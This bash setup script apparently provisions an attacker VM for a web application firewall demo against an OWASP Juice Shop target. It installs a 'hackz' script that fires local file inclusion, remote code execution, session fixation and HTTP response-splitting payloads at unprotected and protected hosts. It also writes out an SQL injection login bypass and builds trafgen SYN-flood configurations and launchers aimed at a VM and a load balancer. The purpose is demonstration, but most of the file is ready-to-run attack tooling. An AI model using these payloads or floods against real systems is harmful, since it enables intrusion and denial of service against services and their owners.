#! /bin/bash

apt update
apt install -y tcpdump fping dnsutils netsniff-ng apache2-utils wrk netcat

iptables -A INPUT -m conntrack --ctstate INVALID -j DROP

export HOST_IP=$(hostname -I | awk '{print $1}')

cat <<EOF > /usr/local/bin/hackz
SPLIT='index.html?foo=advanced%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2035%0d%0a%0d%0a<html>Sorry,%20System%20Down</html>'
echo -e "\n\tUNPROTECTED\n"
echo -e "\$(curl -k --max-time 1.5 -w "%%{http_code}" -s -o /dev/null https://${HOST_BAD_JUICE}/?a=../) - Local File Inclusion \t< curl -k https://${HOST_BAD_JUICE}/?a=../"
echo -e "\$(curl -k --max-time 1.5 -w "%%{http_code}" -s -o /dev/null https://${HOST_BAD_JUICE}/ftp?doc=/bin/ls) - Remote Code Execution \t< curl -k https://${HOST_BAD_JUICE}/ftp?doc=/bin/ls"
echo -e "\$(curl -k --max-time 1.5 -w "%%{http_code}" -s -o /dev/null https://${HOST_BAD_JUICE}/?session_id=a) - Session Fixation \t\t< curl -k https://${HOST_BAD_JUICE}/?session_id=a"
echo -e "\$(curl -k --max-time 1.5 -w "%%{http_code}" -s -o /dev/null https://${HOST_BAD_JUICE}/\$SPLIT) - Protocol attack \t\t< curl -k https://${HOST_BAD_JUICE}/\$SPLIT\n"
echo -e "\n\tPROTECTED\n"
echo -e "\$(curl -k --max-time 1.5 -w "%%{http_code}" -s -o /dev/null https://${HOST_GOOD_JUICE}/?a=../) - Local File Inclusion \t< curl -k https://${HOST_GOOD_JUICE}/?a=../"
echo -e "\$(curl -k --max-time 1.5 -w "%%{http_code}" -s -o /dev/null https://${HOST_GOOD_JUICE}/ftp?doc=/bin/ls) - Remote Code Execution \t< curl -k https://${HOST_GOOD_JUICE}/ftp?doc=/bin/ls"
echo -e "\$(curl -k --max-time 1.5 -w "%%{http_code}" -s -o /dev/null https://${HOST_GOOD_JUICE}/?session_id=a) - Session Fixation \t\t< curl -k -H "session_id=X" https://${HOST_GOOD_JUICE}"
echo -e "\$(curl -k --max-time 1.5 -w "%%{http_code}" -s -o /dev/null https://${HOST_GOOD_JUICE}/\$SPLIT) - Protocol attack \t\t< curl -k https://${HOST_GOOD_JUICE}/\$SPLIT\n"
EOF
chmod a+x /usr/local/bin/hackz

# notes

cat <<EOF > /var/tmp/hackz.txt

https://${HOST_BAD_JUICE}/?a=../
https://${HOST_BAD_JUICE}/ftp?doc=/bin/ls
https://${HOST_BAD_JUICE}/?session_id=a
https://${HOST_BAD_JUICE}/index.html?foo=advanced%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2035%0d%0a%0d%0a<html>Sorry,%20System%20Down</html>

https://${HOST_GOOD_JUICE}/?a=../
https://${HOST_GOOD_JUICE}/ftp?doc=/bin/ls
https://${HOST_GOOD_JUICE}/?session_id=a
https://${HOST_GOOD_JUICE}/index.html?foo=advanced%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2035%0d%0a%0d%0a<html>Sorry,%20System%20Down</html>

# SQLi/XSS exploit
Account: ' OR 1 ---
Password: any password
EOF

# syn flood to juice shop vm ip

cat <<EOF > /usr/local/bin/syn-flood-to-vm.cfg
{
  eth(da=42:01:0a:0a:0a:01,sa=42:01:0a:0a:0a:02)
  ipv4(saddr=$HOST_IP,daddr=$${SYN_FLOOD_HOST_IP},ttl=64)
  tcp(sp=drnd(1000,5000),dp=$${SYN_FLOOD_VM_PORT},syn)
}
EOF

cat <<EOF > /usr/local/bin/flood_vm
trafgen --in syn-flood-to-vm.cfg --out ens4 -b 2000pps -n 40000
EOF
chmod a+x /usr/local/bin/flood_vm

# syn flood to load balancer ip

cat <<EOF > /usr/local/bin/syn-flood-to-lb.cfg
{
  eth(da=42:01:0a:0a:0a:01,sa=42:01:0a:0a:0a:02)
  ipv4(saddr=$HOST_IP,daddr=$${SYN_FLOOD_LB_IP},ttl=64)
  tcp(sp=drnd(1000,5000),dp=$${SYN_FLOOD_LB_PORT},syn)
}
EOF

cat <<EOF > /usr/local/bin/flood_lb
trafgen --in syn-flood-to-lb.cfg --out ens4 -b 2000pps -n 40000
EOF
chmod a+x /usr/local/bin/flood_lb
